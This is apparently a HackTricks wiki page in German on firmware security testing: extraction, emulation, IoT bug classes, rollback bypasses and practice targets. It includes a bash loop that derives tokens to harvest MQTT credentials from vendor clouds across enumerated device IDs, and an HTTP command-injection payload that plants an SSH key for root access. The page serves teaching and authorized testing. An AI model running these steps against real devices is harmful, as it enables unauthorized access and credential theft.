# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die Geräte korrekt arbeiten lässt, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und erleichtert. Sie wird in permanentem Speicher abgelegt, wodurch sichergestellt wird, dass das Gerät vom Moment des Einschaltens an auf wichtige Anweisungen zugreifen kann, was zum Start des Betriebssystems führt. Das Untersuchen und potenzielle Modifizieren von Firmware ist ein entscheidender Schritt bei der Identifizierung von Sicherheitslücken.

## **Informationen sammeln**

**Informationen sammeln** ist ein kritischer erster Schritt, um die Beschaffenheit eines Geräts und die von ihm verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Sammeln von Daten zu:

- der CPU-Architektur und dem Betriebssystem, das darauf läuft
- Bootloader-Details
- Hardware-Layout und Datenblätter
- Codebasis-Metriken und Quellorte
- externen Bibliotheken und Lizenztypen
- Update-Verläufen und regulatorischen Zertifizierungen
- Architektur- und Ablaufdiagrammen
- Sicherheitsbewertungen und identifizierten Sicherheitslücken

Zu diesem Zweck sind **Open-Source Intelligence (OSINT)**-Tools unverzichtbar, ebenso wie die Analyse aller verfügbaren Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analyse, die genutzt werden kann, um potenzielle Probleme zu finden.

## **Firmware beschaffen**

Firmware kann auf verschiedene Arten beschafft werden, jede mit ihrem eigenen Komplexitätsgrad:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Bauen** anhand der bereitgestellten Anweisungen
- **Herunterladen** von offiziellen Support-Seiten
- Nutzung von **Google dork**-Abfragen zum Finden gehosteter Firmware-Dateien
- Direkter Zugriff auf **Cloud-Speicher**, mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **Updates** via Man-in-the-Middle-Techniken
- **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- **Sniffing** nach Update-Anfragen innerhalb der Gerätekommunikation
- Identifizieren und Verwenden von **hardcoded update endpoints**
- **Dumping** aus dem Bootloader oder Netzwerk
- **Entfernen und Auslesen** des Speicherchips, wenn alles andere fehlschlägt, mithilfe geeigneter Hardware-Tools

### UART-only-Logs: eine Root-Shell via U-Boot-Env im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), kannst du trotzdem eine Init-Shell erzwingen, indem du offline den **U-Boot environment blob** bearbeitest:

1. SPI-Flash mit einem SOIC-8-Clip + Programmer (3.3V) dumpen:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Die U-Boot-Env-Partition finden, `bootargs` so bearbeiten, dass `init=/bin/sh` enthalten ist, und für den Blob die **U-Boot env CRC32** neu berechnen.
3. Nur die Env-Partition erneut flashen und neu starten; eine Shell sollte auf UART erscheinen.

Das ist nützlich bei Embedded Devices, bei denen die Bootloader-Shell deaktiviert ist, die Env-Partition aber über externen Flash-Zugriff beschreibbar ist.

## Analysieren der Firmware

Jetzt, da du die **Firmware hast**, musst du Informationen darüber extrahieren, um zu wissen, wie du damit umgehen sollst. Verschiedene Tools, die du dafür verwenden kannst:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, überprüfe die **entropy** des Images mit `binwalk -E <bin>`. Bei niedriger entropy ist es wahrscheinlich nicht verschlüsselt. Bei hoher entropy ist es wahrscheinlich verschlüsselt (oder in irgendeiner Form komprimiert).

Außerdem kannst du diese Tools verwenden, um **files embedded inside the firmware** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Getting the Filesystem

Mit den vorher genannten Tools wie `binwalk -ev <bin>` solltest du das **filesystem extrahiert** haben.\
Binwalk extrahiert es normalerweise in einen **Ordner mit dem Namen des filesystem-Typs**, der meist einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Manchmal hat binwalk **den Magic Byte des filesystem nicht in seinen Signaturen**. In diesen Fällen verwende binwalk, um den **Offset des filesystem zu finden und das komprimierte filesystem aus dem Binary zu carve**n, und **extrahiere** das filesystem anschließend **manuell** entsprechend seinem Typ anhand der folgenden Schritte.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd command** aus, um das Squashfs-Dateisystem zu extrahieren.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ könnte auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware beschafft wurde, ist es wichtig, sie zu zerlegen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dieser Prozess umfasst die Verwendung verschiedener Tools, um nützliche Daten aus dem Firmware-Image zu analysieren und zu extrahieren.

### Tools für die erste Analyse

Eine Reihe von Befehlen wird für die erste Inspektion der Binärdatei (bezeichnet als `<bin>`) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, Binärdaten zu analysieren und die Details von Partitionen und Dateisystemen zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropy** mit `binwalk -E <bin>` geprüft. Niedrige Entropy deutet auf fehlende Verschlüsselung hin, während hohe Entropy auf mögliche Verschlüsselung oder Kompression hinweist.

Zum Extrahieren von **embedded files** werden Tools und Ressourcen wie die Dokumentation zu **file-data-carving-recovery-tools** und **binvis.io** zur Dateianalyse empfohlen.

### Extrahieren des Filesystems

Mit `binwalk -ev <bin>` kann man normalerweise das Filesystem extrahieren, oft in ein Verzeichnis mit dem Namen des Filesystem-Typs (z. B. squashfs, ubifs). Wenn **binwalk** jedoch aufgrund fehlender magic bytes den Filesystem-Typ nicht erkennt, ist eine manuelle Extraktion notwendig. Dabei wird mit `binwalk` der Offset des Filesystems ermittelt, gefolgt vom `dd`-Befehl, um das Filesystem herauszuschneiden:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Danach werden, abhängig vom Filesystem-Typ (z. B. squashfs, cpio, jffs2, ubifs), unterschiedliche Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Filesystem Analysis

Mit dem extrahierten Filesystem beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Network-Daemons, hardcoded credentials, API-Endpoints, Update-Server-Funktionalitäten, unkompilierten Code, Startup-Skripte und kompilierte Binaries für Offline-Analyse geachtet.

**Wichtige Orte** und **Elemente** zur Prüfung sind:

- **etc/shadow** und **etc/passwd** für Benutzer-Credentials
- SSL-Zertifikate und Keys in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binaries für weitere Analyse
- Gängige IoT-Device-Webserver und Binaries

Mehrere Tools helfen dabei, sensible Informationen und Schwachstellen innerhalb des Filesystems aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) für die Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Security Checks on Compiled Binaries

Sowohl Quellcode als auch kompilierte Binaries, die im Filesystem gefunden werden, müssen auf Schwachstellen geprüft werden. Tools wie **checksec.sh** für Unix-Binaries und **PESecurity** für Windows-Binaries helfen dabei, ungeschützte Binaries zu identifizieren, die ausgenutzt werden könnten.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpoint ab, der wie folgt aussieht:

- `https://<api-host>/pf/<deviceId>/<token>`

Während der Firmware-Analyse kann es sein, dass `<token>` lokal aus der deviceId mit einem hardcoded secret abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) und als uppercase hex dargestellt

Dieses Design ermöglicht es jedem, der eine deviceId und die STATIC_KEY kennt, die URL neu zu erzeugen und Cloud-Config abzurufen, wobei oft plaintext MQTT credentials und topic prefixes offengelegt werden.

Praktischer Workflow:

1) deviceId aus UART-Boot-Logs extrahieren

- Einen 3.3V UART-Adapter (TX/RX/GND) anschließen und Logs erfassen:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suche nach Zeilen, die das Cloud-Konfigurations-URL-Muster und die Broker-Adresse ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade Binaries in Ghidra/radare2 und suche nach dem config path ("/pf/") oder MD5-Verwendung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash her und wandle den Digest in Großbuchstaben um:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config und MQTT-Credentials ernten

- Stelle die URL zusammen und ziehe JSON mit curl; parse mit jq, um Secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Missbrauche Klartext-MQTT und schwache Topic-ACLs (falls vorhanden)

- Verwende wiederhergestellte Credentials, um Maintenance-Topics zu abonnieren und nach sensiblen Events zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Vorhersehbare Device-IDs enumerieren (in großem Maßstab, mit Autorisierung)

- Viele Ökosysteme binden Vendor OUI/Product/Type-Bytes ein, gefolgt von einem sequenziellen Suffix.
- Du kannst Kandidaten-IDs durchlaufen, Tokens ableiten und Configs programmatisch abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Hinweise
- Hole immer explizite Autorisierung ein, bevor du mit Mass Enumeration beginnst.
- Bevorzuge Emulation oder statische Analyse, um Secrets ohne Modifikation der Zielhardware wiederherzustellen, wenn möglich.


Der Prozess der Emulation von Firmware ermöglicht **dynamische Analyse** entweder des Betriebs eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Herausforderungen mit Hardware- oder Architekturabhängigkeiten stoßen, aber das Übertragen des Root-Dateisystems oder bestimmter Binaries auf ein Gerät mit passender Architektur und Endianness, wie einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine, kann weitere Tests erleichtern.

### Emulieren einzelner Binaries

Für die Untersuchung einzelner Programme ist es entscheidend, die Endianness und CPU-Architektur des Programms zu identifizieren.

#### Beispiel mit MIPS-Architektur

Um ein Binary mit MIPS-Architektur zu emulieren, kann man den folgenden Befehl verwenden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulationstools zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Für MIPS (big-endian) wird `qemu-mips` verwendet, und für little-endian-Binaries wäre `qemu-mipsel` die Wahl.

#### ARM Architecture Emulation

Für ARM-Binaries ist der Prozess ähnlich, wobei der `qemu-arm`-Emulator für die Emulation genutzt wird.

### Full System Emulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), und andere erleichtern die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamic Analysis in Practice

In dieser Phase wird entweder eine reale oder emulierte Geräteumgebung für die Analyse verwendet. Es ist wichtig, Shell-Zugriff auf das OS und das Filesystem aufrechtzuerhalten. Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt nach, sodass gelegentliche Neustarts der Emulation erforderlich sein können. Die Analyse sollte das Filesystem erneut untersuchen, exponierte Webseiten und Netzwerkdienste ausnutzen und Bootloader-Schwachstellen erkunden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Runtime Analysis Techniques

Runtime-Analyse umfasst die Interaktion mit einem Prozess oder Binary in seiner Laufzeitumgebung, wobei Tools wie gdb-multiarch, Frida und Ghidra zum Setzen von Breakpoints und zum Identifizieren von Schwachstellen durch Fuzzing und andere Techniken verwendet werden.

Für eingebettete Ziele ohne vollständigen Debugger: **kopiere ein statisch gelinktes `gdbserver`** auf das Gerät und verbinde dich remote:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

On IoT hubs ist der RF-Stack oft zwischen einem **radio MCU** und einem Linux userland process aufgeteilt. Ein nützlicher Workflow ist, den Pfad zu mappen:

1. **RF frame** in der Luft
2. **controller-side parser** auf dem radio MCU
3. **serial/UART text or TLV protocol** an Linux weitergeleitet (zum Beispiel `/dev/tty*`)
4. **application dispatcher** im main daemon
5. **protocol-specific handler / state machine**

Diese Architektur schafft statt eines zwei Reverse-Engineering-Ziele. Wenn der controller binäre radio frames in ein textuelles protocol wie `Group,Command,arg1,arg2,...` umwandelt, dann rekonstruiere:

- Die **message groups** und dispatch tables
- Welche messages vom **network** kommen können und welche vom controller selbst
- Die genauen **manufacturer-specific discriminator fields** (zum Beispiel Zigbee `manufacturer_code` und custom `cluster_command`)
- Welche handlers nur während **commissioning**, discovery oder firmware/model download phases erreichbar sind

Für Zigbee speziell: Erfasse pairing traffic und prüfe, ob das Target noch auf dem default **Link Key** `ZigBeeAlliance09` basiert. Falls ja, kann das Sniffen von commissioning traffic den **Network Key** offenlegen. Zigbee 3.0 install codes reduzieren diese Exposure, daher notiere, ob das getestete Gerät sie tatsächlich erzwingt.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands sind oft ein besseres Ziel als standardisierte clusters, weil sie **custom parsing code** und interne **FSMs** mit weniger kampferprobter Validierung speisen.

Praktischer Workflow:

- Reverse den command dispatcher, bis du den **vendor-only handler** findest.
- Rekonstruiere die **FSM state**, **event**, **check**, **action** und **next-state** tables.
- Identifiziere **transitional states**, die automatisch weiterschalten, sowie retry/error branches, die schließlich attacker-controlled state zurücksetzen oder freigeben.
- Bestätige, welche legitimen protocol exchanges nötig sind, um den daemon in den verwundbaren state zu bringen, statt anzunehmen, dass der buggy handler immer erreichbar ist.

Für timing-sensitive protocols kann packet replay aus einem Python framework zu langsam sein. Ein zuverlässigerer Ansatz ist, ein legitimes device auf echter Hardware zu emulieren (zum Beispiel ein **nRF52840**) mit einem vendor-grade stack, damit du die korrekten **endpoints**, **attributes** und commissioning timing auslösen kannst.

### Fragmented-download bug class in embedded daemons

Eine wiederkehrende firmware bug class tritt bei **fragmented blob/model/configuration downloads** auf:

1. Der **first fragment** (`offset == 0`) speichert `ctx->total_size` und allokiert `malloc(total_size)`.
2. Spätere Fragmente validieren nur die attacker-controlled **packet-local** fields wie `packet_total_size >= offset + chunk_len`.
3. Der copy verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)` ohne gegen die **original allocated size** zu prüfen.

Damit kann ein Angreifer Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** deklarierten total size, um eine kleine heap allocation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten offset**, aber einem größeren `chunk_len`.
- Eine gefälschte packet-local size, die die neuen Checks erfüllt und dennoch den ursprünglich allokierten buffer overflowt.

Wenn der verwundbare Pfad hinter commissioning logic liegt, muss die exploitation genug **device emulation** enthalten, um das Target in den erwarteten model-download- oder blob-download state zu bringen, bevor die fehlerhaften Fragmente gesendet werden.

### Protocol-driven `free()` triggers

In embedded daemons ist der einfachste Weg, heap metadata exploitation auszulösen, oft nicht „auf cleanup warten“, sondern **das eigene error handling des protocols erzwingen**:

- Sende fehlerhafte Folgefragmente, um die FSM in **retry**- oder **error** states zu bringen.
- Überschreite den retry threshold, sodass der daemon den **context zurücksetzt** und den beschädigten buffer freigibt.
- Nutze dieses vorhersehbare `free()`, um allocator-side primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich gegen **musl/uClibc/dlmalloc-like** allocators in embedded Linux, wo das Beschädigen von chunk metadata unlink/unbin logic in eine write primitive verwandeln kann. Ein stabiles Muster ist, ein **size field** zu korrumpieren, um die allocator traversal in **fake chunks** umzuleiten, die innerhalb des overflowed buffer vorbereitet wurden, statt sofort reale bin pointers zu zerstören und den Prozess abstürzen zu lassen.

## Binary Exploitation and Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der target architecture und Programmierung in niedrigeren Sprachen. Binary runtime protections in embedded systems sind selten, aber wenn sie vorhanden sind, können Techniken wie Return Oriented Programming (ROP) notwendig sein.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc verwendet fastbins ähnlich wie glibc. Eine spätere große allocation kann `__malloc_consolidate()` auslösen, daher muss jeder fake chunk die Checks überstehen (vernünftige size, `fd = 0` und umliegende chunks müssen als "in use" erscheinen).
- **Non-PIE binaries under ASLR:** Wenn ASLR aktiviert ist, das Hauptbinary aber **non-PIE** ist, bleiben `.data/.bss`-Adressen im Binary stabil. Du kannst einen Bereich anvisieren, der bereits wie ein gültiger heap chunk header aussieht, um eine fastbin allocation auf eine **function pointer table** zu legen.
- **Parser-stopping NUL:** Wenn JSON geparst wird, kann ein `\x00` im payload das Parsen stoppen, während nachfolgende attacker-controlled bytes für einen stack pivot/ROP chain erhalten bleiben.
- **Shellcode via `/proc/self/mem`:** Eine ROP chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren shellcode in einer bekannten mapping platzieren und dorthin springen.

## Prepared Operating Systems for Firmware Analysis

Operating systems wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für firmware security testing und sind mit den nötigen tools ausgestattet.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine distro, die dir dabei hilft, security assessment und penetration testing von Internet of Things (IoT)-Geräten durchzuführen. Sie spart dir viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen notwendigen tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system basierend auf Ubuntu 18.04, vorinstalliert mit firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selbst wenn ein Vendor kryptografische signature checks für firmware images implementiert, wird **version rollback (downgrade) protection häufig weggelassen**. Wenn der boot- oder recovery-loader nur die signature mit einem eingebetteten public key verifiziert, aber nicht die *version* (oder einen monotonic counter) des zu flashenden images vergleicht, kann ein Angreifer legitim eine **ältere, verwundbare firmware installieren, die weiterhin eine gültige signature trägt**, und so gepatchte Schwachstellen wieder einführen.

Typischer attack workflow:

1. **Ein älteres signiertes image beschaffen**
* Von der öffentlichen Download-Portal, CDN oder Support-Website des Vendors holen.
* Aus begleitenden mobile/desktop applications extrahieren (z. B. in einem Android APK unter `assets/firmware/`).
* Aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw. beziehen.
2. **Das image auf das device hochladen oder bereitstellen** über einen beliebigen exponierten update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT usw.
* Viele consumer IoT devices bieten *unauthenticated* HTTP(S)-Endpoints, die Base64-encoded firmware blobs akzeptieren, sie serverseitig dekodieren und recovery/upgrade auslösen.
3. Nach dem downgrade eine Schwachstelle ausnutzen, die in der neueren Version gepatcht wurde (zum Beispiel ein command-injection filter, der später hinzugefügt wurde).
4. Optional das neueste image wieder flashen oder updates deaktivieren, um Entdeckung zu vermeiden, sobald persistence erreicht ist.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (herabgestuften) Firmware wird der `md5`-Parameter direkt in einen Shell-Befehl ohne Sanitisation verkettet, wodurch das Injizieren beliebiger Befehle möglich ist (hier – das Aktivieren von SSH key-based root access). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, aber das Fehlen von downgrade protection macht den Fix wirkungslos.

### Extrahieren von Firmware aus Mobile Apps

Viele Anbieter bündeln vollständige Firmware-Images in ihren begleitenden mobilen Anwendungen, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete werden häufig unverschlüsselt in der APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Tools wie `apktool`, `ghidra` oder sogar einfaches `unzip` ermöglichen es dir, signierte Images zu extrahieren, ohne die physische Hardware anzufassen.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Updater-only anti-rollback bypass in A/B slot designs

Einige Anbieter implementieren zwar einen Anti-Downgrade **ratchet**, aber nur innerhalb der *updater*-Logik (zum Beispiel eine UDS-Routine über CAN, ein recovery-Befehl oder ein userspace OTA-Agent). Wenn der **bootloader** später nur die Image-Signatur/CRC prüft und der Partitionstabelle oder den Slot-Metadaten vertraut, kann der Rollback-Schutz dennoch umgangen werden.

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **security ratchet** / monotonen Zähler.
- Der updater vergleicht den Image-ratchet mit einem Wert im persistent storage und lehnt ältere signierte Images ab.
- Der bootloader parst diesen ratchet **nicht** und verifiziert vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem per-Slot-Generationszähler gespeichert und ist **nicht kryptografisch an den exakten Firmware-Digest gebunden**, der validiert wurde.

Dadurch entsteht in Dual-Slot-Systemen ein **validate-one-image / boot-another-image**-Primitive. Wenn der Angreifer den updater dazu bringen kann, Slot B mit einem aktuellen signierten Image als nächsten Boot-Ziel zu markieren, und Slot B später vor dem Neustart überschreiben kann, kann der bootloader möglicherweise trotzdem das downgrade Image booten, weil er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Typisches Missbrauchsmuster:

1. Ein **aktuelles signiertes** Firmware-Image in den passiven Slot hochladen und die normale Validierungs-/Umschalt-Routine ausführen, sodass das Layout diesen Slot als nächsten aktiven markiert.
2. **Noch nicht neu starten**. In derselben Sitzung erneut die Slot-Vorbereitungs-/Erase-Routine aufrufen.
3. Stale boot-state oder stale Slot-Auswahllogik ausnutzen, sodass der updater denselben physischen Slot löscht, der gerade hochgestuft wurde.
4. Ein **älteres, aber weiterhin signiertes** Firmware-Image in diesen Slot schreiben.
5. Die Validierungsroutine überspringen, die den ratchet erzwingt, und direkt neu starten.
6. Der bootloader wählt den hochgestuften Slot, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf man beim Reverse Engineering von A/B-Update-Implementierungen achten sollte:

- Slot-Auswahl, abgeleitet aus **boot-time flags**, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine `prepare_passive_slot()`-ähnliche Routine, die einen Slot auf Basis von stale state statt des **aktuellen festgeschriebenen Layouts** löscht.
- Eine `part_write_layout()`-ähnliche Funktion, die nur einen **generation counter** / active flag erhöht und nicht den validierten Image-Hash speichert.
- Ratchet-Prüfungen in userspace oder updater-Code implementiert, aber **nicht** in ROM / bootloader / secure boot-Stufen.
- Erase- oder recovery-Routinen, die den Slot als bootfähig markieren, selbst nachdem sein Inhalt gelöscht und neu geschrieben wurde.

### Checklist for Assessing Update Logic

* Ist der Transport/die Authentifizierung des *update endpoint* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen anti-rollback counter**?
* Wird das Image innerhalb einer secure boot chain verifiziert (z. B. Signaturen, die vom ROM-Code geprüft werden)?
* Erzwingt der **bootloader denselben ratchet** wie der updater, statt nur Signatur/CRC zu prüfen?
* Ist die Slot-Aktivierungsmetadaten **an den validierten Firmware-Digest/die Version gebunden**, oder kann ein Slot nach der Hochstufung verändert werden?
* Wird das Gerät nach einem erfolgreichen Slot-Wechsel zum Neustart gezwungen, oder sind spätere Update-/Erase-Routinen in derselben Sitzung noch erreichbar?
* Führt Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partition Map, Modellnummer)?
* Verwenden *partial* oder *backup* Update-Flows dieselbe Validierungslogik erneut?

> 💡  Wenn eines der oben genannten Elemente fehlt, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Vulnerable firmware to practice

Um das Entdecken von Schwachstellen in Firmware zu üben, verwende die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
